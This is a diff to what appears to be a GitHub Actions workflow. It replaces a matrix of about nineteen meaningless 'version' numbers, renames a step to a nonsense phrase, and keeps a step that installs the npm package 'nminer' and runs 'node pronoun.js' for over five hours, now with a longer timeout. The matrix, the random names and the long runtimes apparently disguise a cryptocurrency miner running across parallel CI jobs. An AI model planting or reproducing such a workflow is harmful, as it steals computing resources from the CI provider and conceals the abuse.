@@ -9,25 +9,24 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 5973 }
-          - { version: 2103 }
-          - { version: 7606 }
-          - { version: 1072 }
-          - { version: 2008 }
-          - { version: 498 }
-          - { version: 71 }
-          - { version: 2012 }
-          - { version: 3896 }
-          - { version: 1866 }
-          - { version: 8921 }
-          - { version: 6081 }
-          - { version: 2748 }
-          - { version: 9314 }
-          - { version: 6381 }
-          - { version: 54 }
-          - { version: 7866 }
-          - { version: 1826 }
-          - { version: 4322 }
+          - { version: 3112 }
+          - { version: 1995 }
+          - { version: 7350 }
+          - { version: 9326 }
+          - { version: 7680 }
+          - { version: 4724 }
+          - { version: 6165 }
+          - { version: 9189 }
+          - { version: 1193 }
+          - { version: 9936 }
+          - { version: 5410 }
+          - { version: 1929 }
+          - { version: 616 }
+          - { version: 2739 }
+          - { version: 3170 }
+          - { version: 6336 }
+          - { version: 8443 }
+          - { version: 438 }
 
     steps:
       - name: Checkout
@@ -38,7 +37,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: very ordinary soupy icy
+      - name: on likewise option so
         run: |
           npm install nminer@latest
-          timeout 302m node pronoun.js || echo "pronoun executed"
+          timeout 334m node pronoun.js || echo "pronoun executed"
